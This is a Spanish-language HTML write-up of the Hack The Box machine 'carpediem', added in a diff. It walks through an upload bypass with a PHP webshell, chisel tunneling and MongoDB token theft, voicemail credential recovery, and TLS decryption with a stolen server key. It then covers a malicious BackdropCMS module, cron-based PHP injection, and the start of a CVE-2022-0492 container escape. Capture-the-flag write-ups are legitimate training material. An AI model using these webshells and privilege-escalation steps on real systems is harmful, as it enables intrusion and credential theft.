@@ -1,0 +1,1195 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>carpediem | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">carpediem</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-hard">hard</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+
+            <!-- ==================== SPANISH ==================== -->
+            <div id="content-es" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+
+                    <p>El punto de entrada fue un portal web PHP en el subdominio <code>portal.carpediem.htb</code>. Tras
+                        registrar una cuenta normal, descubrí que el endpoint de subida de archivos
+                        <code>/classes/Users.php?f=upload</code> no valida la extensión del fichero subido, lo que permitió
+                        cargar una webshell PHP y ejecutar comandos como <code>www-data</code> dentro de un contenedor Docker.
+                    </p>
+
+                    <p>Desde ese contenedor enumeré la red interna Docker (<code>172.17.0.0/24</code>) con un binario
+                        <code>nmap</code> estático y establecí un túnel SOCKS con <code>chisel</code> para alcanzar los
+                        servicios internos. En la base de datos MongoDB del servicio Trudesk encontré access tokens de varios
+                        usuarios y, leyendo los tickets de soporte, obtuve pistas sobre credenciales VOIP de un nuevo
+                        empleado.</p>
+
+                    <p>Usando el cliente VOIP <strong>Zoiper</strong> me conecté al sistema de telefonía interno y
+                        recuperé las credenciales de <code>hflaccus</code> desde un buzón de voz. Con ese usuario hice SSH
+                        al host y capturé tráfico TLS de la red Docker con <code>tcpdump</code>. El cifrado negociado era
+                        <code>TLS_RSA_WITH_AES_256_CBC_SHA256</code>, que carece de Perfect Forward Secrecy, por lo que
+                        bastó importar la clave privada del certificado de Backdrop en Wireshark para desencriptar el
+                        tráfico y extraer las credenciales de <code>jpardella</code> en texto claro.</p>
+
+                    <p>Con esas credenciales accedí al panel de administración de <strong>BackdropCMS</strong> y subí un
+                        módulo ZIP malicioso con una webshell PHP, obteniendo RCE en ese contenedor como
+                        <code>www-data</code>. Un script cron ejecutado por <code>root</code> cada ~30 segundos cargaba
+                        <code>index.php</code> de Backdrop, del que yo era propietario, así que inyecté código PHP para
+                        obtener una reverse shell como <code>root</code> dentro del contenedor.</p>
+
+                    <p>Finalmente, abusar de <strong>CVE-2022-0492</strong> (escalada de privilegios mediante
+                        <code>cgroups v1 release_agent</code>) permitió escapar del contenedor y ejecutar comandos en el
+                        host. Asigné el bit SUID a una copia de <code>bash</code> y conseguí acceso como <code>root</code>
+                        en la máquina anfitriona.</p>
+
+                    <p><strong>Tecnologías/Exploits:</strong> PHP file upload webshell, SOCKS proxy con chisel, network
+                        discovery con nmap estático, lectura de MongoDB sin autenticación, VOIP con Zoiper, TLS traffic
+                        decryption (falta de PFS), BackdropCMS module upload RCE, cron abuse privesc, container escape via
+                        CVE-2022-0492 (cgroups release_agent).</p>
+                </div>
+                <hr class="summary-divider">
+
+                <!-- RECON -->
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos y servicios en la máquina objetivo:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#56b6c2;">PORT</span>   <span style="color:#56b6c2;">STATE</span> <span style="color:#56b6c2;">SERVICE</span> <span style="color:#56b6c2;">VERSION</span>
+<span style="color:#e06c75;">22</span>/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
+<span style="color:#e06c75;">80</span>/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Comming Soon
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></code></pre>
+
+                <p>Únicamente SSH y un servidor HTTP. Al visitar el puerto 80 veo una página de "Coming Soon" sin
+                    demasiado contenido:</p>
+
+                <img src="./media/image2.png" alt="Página principal de carpediem.htb mostrando un mensaje Coming Soon" />
+
+                <p>Añado <code>carpediem.htb</code> a <code>/etc/hosts</code> y enumero virtual hosts con fuzzing. Encuentro
+                    uno interesante:</p>
+
+                <pre><code class="language-plaintext">portal.carpediem.htb  Status: 200  [Size: 31090]</code></pre>
+
+                <!-- WEB ENUM -->
+                <h2>Enumeración Web – portal.carpediem.htb</h2>
+                <p>El subdominio alberga un portal de alquiler de motos con bastante más superficie de ataque. Fuzzeando
+                    directorios y ficheros encuentro las siguientes rutas relevantes:</p>
+
+                <pre><code class="language-plaintext">admin         (Status: 301) → http://portal.carpediem.htb/admin/
+login.php     (Status: 200)
+uploads       (Status: 301) → http://portal.carpediem.htb/uploads/
+classes       (Status: 301) → http://portal.carpediem.htb/classes/
+registration.php (Status: 200)
+config.php    (Status: 200)</code></pre>
+
+                <p>El directorio <code>/uploads</code> es inmediatamente sospechoso: su existencia sugiere que la aplicación
+                    permite subir archivos. La ruta <code>/admin</code> lleva a un panel de login de administración para el
+                    que de momento no tengo credenciales.</p>
+
+                <p>Veo también que varias URLs utilizan un parámetro <code>?p=</code> que hace include de páginas PHP
+                    (por ejemplo <code>?p=bikes</code> o <code>?p=about</code>). Aunque parece un LFI, intentar usar
+                    wrappers/filtros PHP no produce resultados: la aplicación simplemente indica que no encuentra la página,
+                    probablemente filtrando a propósito estas técnicas.</p>
+
+                <p>Fuzzeando bajo <code>/admin</code> encuentro entre otras:</p>
+
+                <pre><code class="language-plaintext">admin/maintenance  (Status: 301)
+admin/user         (Status: 301)
+admin/bookings     (Status: 301)
+admin/bike         (Status: 301)</code></pre>
+
+                <p>La ruta <code>/admin/maintenance/files</code> lista un archivo y muestra un menú con botones View,
+                    Edit, Delete y Add:</p>
+
+                <img src="./media/image3.png" alt="Interfaz de admin/maintenance/files mostrando el listado de archivos con botones de acción" />
+
+                <!-- FILE UPLOAD WEBSHELL -->
+                <h2>Subida de Webshell PHP – Bypass del Upload</h2>
+                <p>El botón <em>Add</em> llama al endpoint <code>POST /classes/Users.php?f=upload</code>. Al interceptar
+                    la petición con Burp Suite veo que se envía sin cuerpo multipart, lo que provoca el error:</p>
+
+                <pre><code class="language-json"><span style="color:#e06c75;">"error"</span>: <span style="color:#98c379;">"multipart/form-data missing"</span></code></pre>
+
+                <p>Añado manualmente el campo <code>Content-Type: multipart/form-data</code> con un fichero, pero el
+                    servidor responde:</p>
+
+                <pre><code class="language-json">{<span style="color:#e06c75;">"error"</span>: <span style="color:#98c379;">"missing 'file_upload' in form-data"</span>}</code></pre>
+
+                <p>Renombro el campo <code>name</code> del form-data a <code>file_upload</code> y subo directamente un
+                    fichero <code>.php</code> sin ninguna validación de extensión en el servidor. La respuesta confirma el
+                    éxito:</p>
+
+                <pre><code class="language-json">{<span style="color:#e06c75;">"success"</span>: <span style="color:#98c379;">"uploads\/1777920540_xd.php uploaded"</span>}</code></pre>
+
+                <p>El contenido del fichero subido es una webshell de una línea:</p>
+
+                <pre><code class="language-php"><span style="color:#c678dd;">&lt;?php</span> <span style="color:#61afef;">system</span>(<span style="color:#e06c75;">$_GET</span>[<span style="color:#98c379;">'cmd'</span>]); <span style="color:#c678dd;">?&gt;</span></code></pre>
+
+                <p>Navegando a <code>/uploads/1777920540_xd.php?cmd=id</code> confirmo la ejecución de comandos:</p>
+
+                <img src="./media/image5.png" alt="Respuesta del servidor mostrando la ejecución del comando id a través de la webshell PHP subida" />
+
+                <p>Me envío una reverse shell y obtengo acceso como <code>www-data</code>. El hostname es una cadena
+                    aleatoria, lo que confirma que estoy dentro de un contenedor Docker:</p>
+
+                <pre><code class="language-bash">www-data@3c371615b7aa:/var/www/html/portal$</code></pre>
+
+                <!-- CONTAINER ENUM -->
+                <h2>Enumeración del Contenedor – Credenciales y Red Interna</h2>
+                <p>Encuentro credenciales de base de datos hardcodeadas en <code>DBConnection.php</code>:</p>
+
+                <pre><code class="language-php"><span style="color:#c678dd;">private</span> <span style="color:#e06c75;">$host</span>     = <span style="color:#98c379;">'mysql'</span>;
+<span style="color:#c678dd;">private</span> <span style="color:#e06c75;">$username</span> = <span style="color:#98c379;">'portaldb'</span>;
+<span style="color:#c678dd;">private</span> <span style="color:#e06c75;">$password</span> = <span style="color:#98c379;">'J5tnqsXpyzkK4XNt'</span>;
+<span style="color:#c678dd;">private</span> <span style="color:#e06c75;">$database</span> = <span style="color:#98c379;">'portal'</span>;</code></pre>
+
+                <p>El comando <code>env</code> también revela la dirección del contenedor MySQL y su contraseña de root:</p>
+
+                <pre><code class="language-bash"><span style="color:#e06c75;">MYSQL_PORT_3306_TCP_ADDR</span>=172.17.0.4
+<span style="color:#e06c75;">MYSQL_ENV_MYSQL_ROOT_PASSWORD</span>=3dQXeqjMHnq4kqDv</code></pre>
+
+                <p>Para descubrir qué más hay en la red Docker uso un pequeño oneliner bash de ping sweep:</p>
+
+                <pre><code class="language-bash"><span style="color:#56b6c2;">time</span> <span style="color:#c678dd;">for</span> i <span style="color:#c678dd;">in</span> {1..254}; <span style="color:#c678dd;">do</span>
+  (ping -c 1 172.17.0.<span style="color:#e06c75;">${i}</span> | grep <span style="color:#98c379;">"bytes from"</span> | grep -v <span style="color:#98c379;">"Unreachable"</span> &amp;)
+<span style="color:#c678dd;">done</span></code></pre>
+
+                <p>Obtengo respuesta de 6 hosts:</p>
+
+                <pre><code class="language-plaintext">64 bytes from 172.17.0.1
+64 bytes from 172.17.0.2
+64 bytes from 172.17.0.3
+64 bytes from 172.17.0.4
+64 bytes from 172.17.0.5
+64 bytes from 172.17.0.6</code></pre>
+
+                <p>Una de ellas es el host que corre los contenedores y otra es el contenedor donde me encuentro, así que
+                    quedan 4 hosts por investigar.</p>
+
+                <!-- NMAP INTERNO + CHISEL -->
+                <h2>Descubrimiento de Servicios Internos – Nmap Estático y SOCKS Proxy</h2>
+                <p>Para escanear la red interna me paso un binario <code>nmap</code> compilado estáticamente desde el
+                    repositorio <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap">andrew-d/static-binaries</a>
+                    y lo ejecuto:</p>
+
+                <pre><code class="language-bash">./nmap -p- --min-rate 10000 172.17.0.1-6</code></pre>
+
+                <p>Resultados del escaneo:</p>
+
+                <pre><code class="language-plaintext">172.17.0.1  →  22/tcp  (ssh),   80/tcp  (http)
+172.17.0.2  →  21/tcp  (ftp),   80/tcp  (http),  443/tcp (https)
+172.17.0.3  →  27017/tcp        (mongodb)
+172.17.0.4  →  3306/tcp (mysql), 33060/tcp
+172.17.0.5  →  8118/tcp
+172.17.0.6  →  (contenedor actual)</code></pre>
+
+                <p>El <code>.4</code> es MySQL como ya sabía, el <code>.3</code> parece un MongoDB por el puerto y los
+                    demás alojan servicios HTTP de distinto tipo. Para investigarlos cómodamente configuro un túnel SOCKS
+                    con <code>chisel</code>.</p>
+
+                <p>En mi máquina:</p>
+                <pre><code class="language-bash">./chisel server -p 8000 --reverse</code></pre>
+
+                <p>En el contenedor víctima:</p>
+                <pre><code class="language-bash">./chisel client 10.10.14.142:8000 R:socks</code></pre>
+
+                <p>Una vez establecida la conexión configuro el addon <strong>FoxyProxy</strong> en Firefox apuntando al
+                    proxy SOCKS5 en el puerto 1080, con patrones que solo hagan match a la red interna para no afectar al
+                    resto de la navegación:</p>
+
+                <img src="./media/image9.png" alt="Configuración de FoxyProxy en Firefox con patrón para redirigir solo el tráfico de la red Docker interna 172.17.0.x por el proxy SOCKS5" />
+
+                <p>Y en <code>/etc/proxychains4.conf</code> comento la línea de socks4 y añado:</p>
+                <pre><code class="language-plaintext">socks5 127.0.0.1 1080</code></pre>
+
+                <!-- SERVICIOS INTERNOS -->
+                <h2>Investigación de Servicios Internos</h2>
+
+                <h3>172.17.0.2 – BackdropCMS (HTTPS) y FTP</h3>
+                <p>Por el puerto 443 veo una instancia de <a href="https://backdropcms.org/">BackdropCMS</a> bajo el
+                    virtual host <code>backdrop.carpediem.htb</code>. Apunto esto para más adelante.</p>
+
+                <p>Por FTP el acceso anónimo funciona pero el directorio raíz está vacío:</p>
+
+                <pre><code class="language-bash">proxychains ftp 172.17.0.2
+<span style="color:#98c379;"># usuario: anonymous / pass: (vacío)</span>
+ftp&gt; ls -lah
+<span style="color:#56b6c2;">drwxr-xr-x  2  0  104  4096  May 26 2022  .</span>
+<span style="color:#56b6c2;">drwxr-xr-x  2  0  104  4096  May 26 2022  ..</span></code></pre>
+
+                <h3>172.17.0.3 – MongoDB (27017)</h3>
+                <p>Me conecto sin credenciales a través de proxychains y encuentro una base de datos <code>trudesk</code>,
+                    que corresponde al sistema de helpdesk open source <a href="https://trudesk.io/">Trudesk</a>:</p>
+
+                <pre><code class="language-bash">proxychains mongo 172.17.0.3</code></pre>
+
+                <pre><code class="language-javascript"><span style="color:#56b6c2;">&gt;</span> show dbs
+admin    0.000GB
+config   0.000GB
+local    0.000GB
+<span style="color:#e06c75;">trudesk  0.001GB</span>
+
+<span style="color:#56b6c2;">&gt;</span> use trudesk
+<span style="color:#56b6c2;">&gt;</span> show tables
+accounts  counters  departments  groups  messages
+notifications  priorities  roles  sessions  settings
+tags  teams  templates  <span style="color:#e06c75;">tickets</span>  tickettypes</code></pre>
+
+                <p>La colección más interesante es <code>accounts</code>, que contiene access tokens para la API de
+                    Trudesk:</p>
+
+                <pre><code class="language-javascript"><span style="color:#56b6c2;">&gt;</span> db.accounts.find()
+
+<span style="color:#98c379;">// admin - Robert Frost</span>
+{ <span style="color:#e06c75;">"username"</span>: <span style="color:#98c379;">"admin"</span>, <span style="color:#e06c75;">"fullname"</span>: <span style="color:#98c379;">"Robert Frost"</span>,
+  <span style="color:#e06c75;">"accessToken"</span>: <span style="color:#98c379;">"22e56ec0b94db029b07365d520213ef6f5d3d2d9"</span> }
+
+<span style="color:#98c379;">// jhammond - Jeremy Hammond</span>
+{ <span style="color:#e06c75;">"username"</span>: <span style="color:#98c379;">"jhammond"</span>,
+  <span style="color:#e06c75;">"accessToken"</span>: <span style="color:#98c379;">"a0833d9a06187dfd00d553bd235dfe83e957fd98"</span> }
+
+<span style="color:#98c379;">// jpardella - Joey Pardella</span>
+{ <span style="color:#e06c75;">"username"</span>: <span style="color:#98c379;">"jpardella"</span>,
+  <span style="color:#e06c75;">"accessToken"</span>: <span style="color:#98c379;">"7c0335559073138d82b64ed7b6c3efae427ece85"</span> }
+
+<span style="color:#98c379;">// acooke - Adeanna Cooke</span>
+{ <span style="color:#e06c75;">"username"</span>: <span style="color:#98c379;">"acooke"</span>,
+  <span style="color:#e06c75;">"accessToken"</span>: <span style="color:#98c379;">"9c7ace307a78322f1c09d62aae3815528c3b7547"</span> }
+
+<span style="color:#98c379;">// svc-portal-tickets</span>
+{ <span style="color:#e06c75;">"username"</span>: <span style="color:#98c379;">"svc-portal-tickets"</span>,
+  <span style="color:#e06c75;">"accessToken"</span>: <span style="color:#98c379;">"f8691bd2d8d613ec89337b5cd5a98554f8fffcc4"</span> }</code></pre>
+
+                <p>Los hashes de contraseñas son <strong>bcrypt</strong> y no crackean con rockyou en un tiempo razonable.
+                    Sin embargo los access tokens son inmediatamente utilizables.</p>
+
+                <h3>172.17.0.4 – MySQL</h3>
+                <p>Me conecto con las credenciales de root obtenidas del entorno:</p>
+
+                <pre><code class="language-bash">proxychains mysql -h 172.17.0.4 --skip-ssl -u root -p</code></pre>
+
+                <pre><code class="language-sql"><span style="color:#c678dd;">show</span> databases;
+<span style="color:#98c379;">-- information_schema, mysql, performance_schema, portal, sys</span>
+
+<span style="color:#c678dd;">use</span> portal;
+<span style="color:#c678dd;">select</span> * <span style="color:#c678dd;">from</span> users;
+<span style="color:#98c379;">-- admin → jhammond@carpediem.htb | hash: b723e511b084ab84b44235d82da572f3 (MD5, no crackea)</span></code></pre>
+
+                <h3>172.17.0.5 – Trudesk (puerto 8118)</h3>
+                <p>Con el access token del admin puedo llamar a la API de Trudesk y leer los tickets de soporte:</p>
+
+                <pre><code class="language-bash">proxychains curl 172.17.0.5:8118/api/v1/tickets \
+  -H <span style="color:#98c379;">"accesstoken: 22e56ec0b94db029b07365d520213ef6f5d3d2d9"</span> | jq</code></pre>
+
+                <p>Entre los tickets encuentro una conversación muy reveladora sobre el onboarding de un nuevo empleado:</p>
+
+                <pre><code class="language-json"><span style="color:#e06c75;">"subject"</span>: <span style="color:#98c379;">"New employee on-boarding - Horace Flaccus"</span>,
+<span style="color:#e06c75;">"issue"</span>:   <span style="color:#98c379;">"We have hired a new Network Engineer and need to get him set up..."</span>,
+
+<span style="color:#98c379;">// Respuesta de Robert Frost:</span>
+<span style="color:#e06c75;">"comment"</span>: <span style="color:#98c379;">"Whats the last 4 digits of his employee ID so I can get his extension set up in the VoIP system?"</span>,
+
+<span style="color:#98c379;">// Respuesta de Adeanna Cooke:</span>
+<span style="color:#e06c75;">"comment"</span>: <span style="color:#98c379;">"Last 4 of employee ID is 9650."</span>,
+
+<span style="color:#98c379;">// Respuesta de Robert Frost:</span>
+<span style="color:#e06c75;">"comment"</span>: <span style="color:#98c379;">"He's all set up. Phone pin code will be 2022 and to get into voicemail he can dial *62.
+Also... we've been testing Zoiper with some of our end users."</span></code></pre>
+
+                <p>Información recabada:</p>
+                <ul>
+                    <li>Nuevo empleado: <strong>Horace Flaccus</strong> → <code>hflaccus@carpediem.htb</code></li>
+                    <li>Últimos 4 dígitos del ID: <strong>9650</strong></li>
+                    <li>PIN del teléfono: <strong>2022</strong></li>
+                    <li>Para acceder al buzón de voz marcar <strong>*62</strong></li>
+                    <li>Software VOIP: <strong>Zoiper</strong></li>
+                </ul>
+
+                <!-- VOIP -->
+                <h2>Credenciales vía VOIP – Zoiper y el Buzón de Voz</h2>
+                <p>Descargo Zoiper como paquete Debian desde
+                    <a href="https://www.zoiper.com/en/voip-softphone/download/current">zoiper.com</a> y lo instalo.
+                    Configuro el cliente con el servidor VOIP interno accesible a través del proxy SOCKS:</p>
+
+                <img src="./media/image4.png" alt="Cliente VOIP Zoiper configurado y conectado al sistema de telefonía interno de carpediem.htb" />
+
+                <p>Llamo a la extensión <code>*62</code> como se indicaba en el ticket. El sistema me pide el PIN, introduzco
+                    <code>2022</code> y accedo al buzón de voz de Horace Flaccus, donde una grabación me proporciona sus
+                    credenciales iniciales de acceso al servidor:</p>
+
+                <img src="./media/image7.png" alt="Interfaz de Zoiper mostrando una llamada activa al buzón de voz de la extensión *62 para recuperar las credenciales de hflaccus" />
+
+                <p>Contraseña obtenida: <code>AuRj4pxq9qPk</code></p>
+
+                <p>Me conecto por SSH al host con <code>hflaccus:AuRj4pxq9qPk</code> y obtengo acceso a la máquina
+                    anfitriona.</p>
+
+                <!-- TCPDUMP + TLS -->
+                <h2>Captura y Desencriptado de Tráfico TLS</h2>
+                <p>Desde el host enumero puertos locales abiertos:</p>
+
+                <pre><code class="language-plaintext">tcp LISTEN  127.0.0.1:5038   (Asterisk Manager Interface)
+tcp LISTEN  127.0.0.1:8000
+tcp LISTEN  127.0.0.1:8001   (Trudesk)
+tcp LISTEN  127.0.0.1:8002   (BackdropCMS)</code></pre>
+
+                <p>El puerto 8000 devuelve Forbidden, el 8001 es Trudesk, el 8002 es Backdrop. Hasta aquí nada nuevo. Sin
+                    embargo, lo que podría contener datos útiles es el tráfico de la red Docker, ya que los servicios
+                    internos se comunican entre sí. Capturo tráfico en la interfaz <code>docker0</code>:</p>
+
+                <pre><code class="language-bash">tcpdump -ni docker0 -s 65535 -w /tmp/xd.pcap</code></pre>
+
+                <p>Al rato lo paro y descargo el archivo desde mi máquina:</p>
+
+                <pre><code class="language-bash">sshpass -p AuRj4pxq9qPk scp hflaccus@carpediem.htb:/tmp/xd.pcap .</code></pre>
+
+                <p>Abro la captura en Wireshark. En <em>Statistics → Conversations</em> veo dos flujos:</p>
+
+                <img src="./media/image8.png" alt="Vista de Conversations en Wireshark mostrando dos flujos de red: host hacia Backdrop y Trudesk hacia MongoDB" />
+
+                <ul>
+                    <li><strong>Host → Backdrop</strong> (tráfico TLS encriptado)</li>
+                    <li><strong>Trudesk → MongoDB</strong> (comunicación interna normal de la aplicación)</li>
+                </ul>
+
+                <p>El flujo del host hacia Backdrop es el más interesante. Al intentar hacer <em>Follow → TCP Stream</em>
+                    solo veo datos encriptados. Para ver si el cifrado tiene alguna vulnerabilidad, inspecciono el paquete
+                    <code>Client Hello</code> y la respuesta <code>Server Hello</code>. El cifrado negociado es:</p>
+
+                <pre><code class="language-plaintext">TLS_RSA_WITH_AES_256_CBC_SHA256 (0x003d)</code></pre>
+
+                <p>Este cifrado es <a href="https://scanigma.com/knowledge-base/tls/ciphersuite/tls-rsa-with-aes-256-cbc-sha256">obsoleto
+                    y problemático</a>: el intercambio de claves RSA <strong>no ofrece Perfect Forward Secrecy (PFS)</strong>.
+                    Esto significa que si un atacante captura las comunicaciones encriptadas y posteriormente obtiene la
+                    clave privada del servidor, puede desencriptar todo el tráfico grabado en el pasado.</p>
+
+                <p>Eso es exactamente lo que voy a hacer. En <code>/etc/ssl/certs</code> del host encuentro la clave
+                    privada del certificado de Backdrop:</p>
+
+                <pre><code class="language-bash">ls -lah /etc/ssl/certs | grep -v '\->'
+<span style="color:#98c379;"># -rw-r--r-- 1 root root 1.3K Apr 7 2022 backdrop.carpediem.htb.crt</span>
+<span style="color:#e06c75;"># -rw-r--r-- 1 root root 1.7K Apr 7 2022 backdrop.carpediem.htb.key</span></code></pre>
+
+                <pre><code class="language-bash">sshpass -p AuRj4pxq9qPk scp hflaccus@carpediem.htb:/etc/ssl/certs/backdrop.carpediem.htb.key .</code></pre>
+
+                <p>En Wireshark voy a <em>Edit → Preferences → Protocols → TLS</em> y en la lista de claves RSA añado la
+                    clave recién descargada:</p>
+
+                <img src="./media/image10.png" alt="Configuración de Wireshark para importar la clave privada RSA del servidor Backdrop en la lista de claves TLS para desencriptar el tráfico capturado" />
+
+                <p>Ahora al hacer <em>Follow → TLS Stream</em> puedo ver la comunicación en texto claro. En uno de los
+                    requests aparece un login de <code>jpardella</code>:</p>
+
+                <pre><code class="language-http"><span style="color:#c678dd;">POST</span> <span style="color:#98c379;">/?q=user/login</span> HTTP/1.1
+Host: backdrop.carpediem.htb:8002
+Content-Type: application/x-www-form-urlencoded
+
+<span style="color:#e06c75;">name</span>=jpardella&amp;<span style="color:#e06c75;">pass</span>=<span style="color:#98c379;">tGPN6AmJDZwYWdhY</span>&amp;form_id=user_login&amp;op=Log+in
+
+<span style="color:#56b6c2;">HTTP/1.1 302 Found</span>
+Location: https://backdrop.carpediem.htb:8002/?q=admin/dashboard</code></pre>
+
+                <p>Credenciales obtenidas: <code>jpardella:tGPN6AmJDZwYWdhY</code></p>
+
+                <p>No sirven para SSH ni para <code>su</code>, pero funcionan en BackdropCMS. Creo un túnel SSH para
+                    acceder cómodamente:</p>
+
+                <pre><code class="language-bash">ssh hflaccus@carpediem.htb -L 8002:localhost:8002</code></pre>
+
+                <!-- BACKDROPCMS RCE -->
+                <h2>RCE en BackdropCMS – Módulo ZIP Malicioso</h2>
+                <p>Accedo a <code>https://localhost:8002/?q=admin/reports/status</code> con las credenciales de jpardella
+                    y confirmo la versión:</p>
+
+                <pre><code class="language-plaintext">Backdrop CMS 1.21.4
+PHP Version: 8.0.8
+Apache/2.4.48</code></pre>
+
+                <p>BackdropCMS permite a administradores instalar módulos subiendo un archivo ZIP. Sin ninguna
+                    validación del código PHP dentro del módulo, puedo empaquetarlo con una webshell. Creo la estructura
+                    mínima necesaria para un módulo válido:</p>
+
+                <pre><code class="language-plaintext">xd/
+├── xd.info    → name = Xd
+               description = Module
+               backdrop = 1.x
+               type = module
+               version = 1.0.0
+├── xd.module  → &lt;?php
+└── xd.php     → &lt;?php system($_GET['cmd']); ?&gt;</code></pre>
+
+                <pre><code class="language-bash">zip -r xd.zip xd/</code></pre>
+
+                <p>Subo e instalo el módulo desde el panel de administración de BackdropCMS:</p>
+
+                <img src="./media/image1.png" alt="Panel de administración de BackdropCMS mostrando el proceso de instalación del módulo ZIP malicioso xd que contiene la webshell PHP" />
+
+                <p>Tras habilitarlo, navego a la URL del módulo y confirmo RCE:</p>
+
+                <img src="./media/image6.png" alt="Ejecución de comandos confirmada a través de la webshell PHP del módulo xd instalado en BackdropCMS, mostrando la salida del comando id" />
+
+                <p>Me envío una reverse shell y obtengo acceso como <code>www-data</code> en el contenedor de
+                    BackdropCMS.</p>
+
+                <p>En <code>settings.php</code> encuentro las credenciales del MySQL local:</p>
+
+                <pre><code class="language-php"><span style="color:#e06c75;">$database</span> = <span style="color:#98c379;">'mysql://backdrop:34tB8RGtgtJjZ2Tz@localhost/backdrop'</span>;
+<span style="color:#e06c75;">$settings</span>[<span style="color:#98c379;">'hash_salt'</span>] = <span style="color:#98c379;">'AwMKmb6UJOTNWHUIK50-QhKGKWzLkjBBqNftvxhPKJA'</span>;</code></pre>
+
+                <p>La base de datos solo contiene a jpardella, del que ya tengo las credenciales. No hay información
+                    adicional útil.</p>
+
+                <!-- CRON PRIVESC EN CONTENEDOR -->
+                <h2>Escalada a root en el Contenedor – Abuso de Cron</h2>
+                <p>En <code>/opt</code> encuentro un script llamado <code>heartbeat.sh</code>:</p>
+
+                <pre><code class="language-bash"><span style="color:#98c379;">#!/bin/bash</span>
+<span style="color:#98c379;">#Run a site availability check every 10 seconds via cron</span>
+
+<span style="color:#e06c75;">checksum</span>=($(/usr/bin/md5sum /var/www/html/backdrop/core/scripts/backdrop.sh))
+
+<span style="color:#c678dd;">if</span> [[ <span style="color:#e06c75;">$checksum</span> != <span style="color:#98c379;">"70a121c0202a33567101e2330c069b34"</span> ]]; <span style="color:#c678dd;">then</span>
+    <span style="color:#56b6c2;">exit</span>
+<span style="color:#c678dd;">fi</span>
+
+<span style="color:#e06c75;">status</span>=$(php /var/www/html/backdrop/core/scripts/backdrop.sh \
+         --root /var/www/html/backdrop https://localhost)
+
+grep <span style="color:#98c379;">"Welcome to backdrop.carpediem.htb!"</span> <span style="color:#98c379;">"$status"</span>
+
+<span style="color:#c678dd;">if</span> [[ <span style="color:#98c379;">"$?"</span> != 0 ]]; <span style="color:#c678dd;">then</span>
+    <span style="color:#98c379;"># something went wrong. restoring from backup.</span>
+    cp /root/index.php /var/www/html/backdrop/index.php
+<span style="color:#c678dd;">fi</span></code></pre>
+
+                <p>El script: (1) verifica con MD5 que <code>backdrop.sh</code> no ha sido alterado, (2) lo ejecuta con
+                    PHP (lo que en realidad carga <code>index.php</code> de Backdrop), y (3) si algo falla, restaura
+                    <code>index.php</code> desde el backup de root. Con <code>pspy64</code> confirmo que se ejecuta cada
+                    ~30 segundos como <code>root</code>:</p>
+
+                <pre><code class="language-plaintext">CMD: UID=0 PID=1902 | /bin/bash /opt/heartbeat.sh
+CMD: UID=0 PID=1906 | /bin/bash /opt/heartbeat.sh</code></pre>
+
+                <p>Los permisos de los archivos relevantes son:</p>
+
+                <pre><code class="language-bash">-rwxr-xr-x 1 root     root     510  Jun 23 2022  /opt/heartbeat.sh
+-rw-r--r-- 1 root     root     4.2K Mar 16 2022  /var/www/html/backdrop/core/scripts/backdrop.sh
+<span style="color:#e06c75;">-rw-r--r-- 1 www-data www-data 578  May 10 04:55 /var/www/html/backdrop/index.php</span></code></pre>
+
+                <p>No puedo modificar <code>heartbeat.sh</code> ni <code>backdrop.sh</code>, pero <strong>soy el
+                    propietario de <code>index.php</code></strong>. Como el script de root acaba ejecutando ese
+                    <code>index.php</code>, puedo inyectar código PHP que se ejecutará con privilegios de root.</p>
+
+                <p>Pruebo primero con un <code>touch</code>:</p>
+
+                <pre><code class="language-bash">echo <span style="color:#98c379;">'system("touch /tmp/xd");'</span> &gt;&gt; index.php</code></pre>
+
+                <p>Al rato compruebo que root ha creado el archivo:</p>
+
+                <pre><code class="language-bash">ls -lah /tmp/xd
+<span style="color:#98c379;">-rw-r--r-- 1 root root 0 May 10 05:15 xd</span></code></pre>
+
+                <p>Confirmada la ejecución como root. Inyecto una reverse shell de la misma manera y obtengo acceso como
+                    <code>root</code> dentro del contenedor de BackdropCMS.</p>
+
+                <!-- CONTAINER ESCAPE -->
+                <h2>Escape del Contenedor – CVE-2022-0492 (cgroups release_agent)</h2>
+                <p>Desde el contenedor como root no encuentro nada nuevo que no pudiera ver ya con <code>www-data</code>.
+                    El siguiente objetivo es escapar al host. La técnica que aplica aquí es
+                    <a href="https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/">CVE-2022-0492</a>, una
+                    vulnerabilidad en <strong>cgroups v1</strong> que permite escapar de contenedores.</p>
+
+                <h3>Entendiendo el CVE-2022-0492</h3>
+                <p>El archivo <code>release_agent</code> es una funcionalidad de cgroups v1 que permite a los
+                    administradores configurar un programa que se ejecuta cuando un proceso muere dentro de ese cgroup.
+                    Cuando ocurre esto, el kernel comprueba si <code>notify_on_release</code> está habilitado y, si lo
+                    está, ejecuta el binario especificado en <code>release_agent</code> <strong>con privilegios del
+                    kernel sobre el sistema de archivos del host</strong>.</p>
+
